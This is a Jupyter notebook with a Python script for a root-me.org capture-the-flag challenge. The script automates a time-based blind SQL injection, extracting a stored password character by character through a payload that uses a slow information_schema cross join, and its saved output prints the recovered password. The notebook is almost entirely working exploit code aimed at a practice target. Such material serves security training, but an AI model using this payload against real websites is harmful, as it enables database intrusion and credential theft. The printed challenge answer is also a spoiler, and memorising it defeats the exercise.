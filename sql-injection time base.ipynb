{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "6272213d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Possible password found T!m3B@s3DSQL!\n",
      "\n"
     ]
    }
   ],
   "source": [
    "#!/usr/bin/python3\n",
    "# -*- coding: utf-8 -*-\n",
    "\"\"\"\n",
    "vic511 for root-me.org - SQL Time Based\n",
    "\"\"\"\n",
    "import requests # à installer si ce n'est pas déjà fait\n",
    "import urllib\n",
    "import time\n",
    " \n",
    "def makeReq(payload):\n",
    "        return requests.get(\n",
    "                \"http://challenge01.root-me.org/web-serveur/ch40/?action=member&member={}\".format(\n",
    "                urllib.parse.quote(payload))\n",
    "        ).content.decode(\"UTF-8\")\n",
    " \n",
    " \n",
    "def dynOut(string): # pour un affichage dynamique (je trouve ça moins stressant)\n",
    "        print(string, end=\"\\r\")\n",
    " \n",
    "length = 32 # valeur inutile et erronée, en réalité le script se stoppe tout seul, mais bon on sait jamais\n",
    "pwd = \"\"\n",
    "payload = '1 AND exists(SELECT password FROM users WHERE id=1 AND ascii(substring(password,{},1))={}) AND 1>(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)'\n",
    " \n",
    "for x in range(length):\n",
    "        for code in range(32, 123):\n",
    "                dynOut(\"Password : \" + pwd + chr(code))\n",
    "                begin = time.time()\n",
    "                c = makeReq(payload.format(x + 1, code)) # inutile de stocker le retour, mais par principe je le fais\n",
    "                t = time.time() - begin\n",
    "                if t > 2:\n",
    "                        pwd += chr(code)\n",
    "                        break\n",
    " \n",
    "        if not len(pwd) == x + 1:\n",
    "                dynOut(\"Possible password found \" + pwd)\n",
    "                break\n",
    " \n",
    "print(\"\\n\") # car retour chariot, sinon overwrite de la sortie standard"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "575d3895",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
